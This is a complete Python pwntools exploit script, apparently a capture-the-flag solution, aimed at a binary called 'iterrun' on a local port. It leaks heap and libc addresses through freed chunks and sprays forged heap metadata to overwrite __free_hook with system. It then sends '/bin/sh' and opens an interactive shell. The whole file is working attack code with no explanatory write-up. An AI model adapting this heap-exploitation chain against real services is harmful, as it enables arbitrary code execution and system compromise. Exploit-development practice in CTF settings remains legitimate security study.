#!/usr/bin/env python3

from pwn import *

exe = ELF("./iterrun")

context.binary = exe


def conn():
        return process([exe.path])


#r = conn()
r = remote("localhost", 9997)

def execute(payload):
    r.sendlineafter("CMD> ", payload)

def add(secret, magic):
    execute(("add " + secret + " " + str(magic)).encode())

def main():
    
    add("A"*0x60, 0)
    add("B"*0x50, 1)
    add("C"*0x40, 2)
    add("D"*0x30, 3)

    execute("show 3")
    execute("delete_now 3")
    execute("delete 2")
    pause()
    execute("finish 4")
    r.recvuntil("secret : ")
    HEAP_LEAK = u64(r.recv(8))
    log.warn("Heap leak @ 0x%x", HEAP_LEAK)
    HEAP_BASE = HEAP_LEAK - 0x13aa0
    log.warn("Heap base @ 0x%x", HEAP_BASE)
    
    libc_in_heap = HEAP_BASE + 0x14730

    payload  = p64(libc_in_heap) + p64(0x30)
    payload += p64(0x30) + p64(0)
    payload += p64(0x1337) + p64(HEAP_BASE+0x14488)
    payload += p64(0x0) + p64(0x0)
    payload += p64(0x0) + p64(0x0100)
    

    execute(payload*(int(0x500/len(payload))))


    for i in range(6):
        add("A", 0)
    
    add("B"*0x30, 1)
    execute("delete 6")
    execute("finish 8")
    r.recvuntil("secret : ")
    LIBC_LEAK = u64(r.recv(8))
    log.warn("libc leak @ 0x%x", LIBC_LEAK)
    LIBC_BASE = LIBC_LEAK - 0x1c6be0
    log.warn("libc base @ 0x%x", LIBC_BASE)

    # __free_hook
    payload  = p64(LIBC_BASE + 0x1c9b28) + p64(0x30)
    payload += p64(0x30) + p64(0)
    payload += p64(0x100001337) + p64(HEAP_BASE+0x14910)
    payload += p64(0x8) + p64(0x8)
    payload += p64(0x0) + p64(0x0)

    
    system = LIBC_BASE + 0x30410
    execute(payload*(int(0x480/len(payload))) + p64(system)*4)

    for i in range(10):
        add("M"*7, 0)

    add("MAHER", 1)
    execute("delete 10")
    execute("finish 12")

    execute("/bin/sh\x00"*0x100)

    r.interactive()


if __name__ == "__main__":
    main()

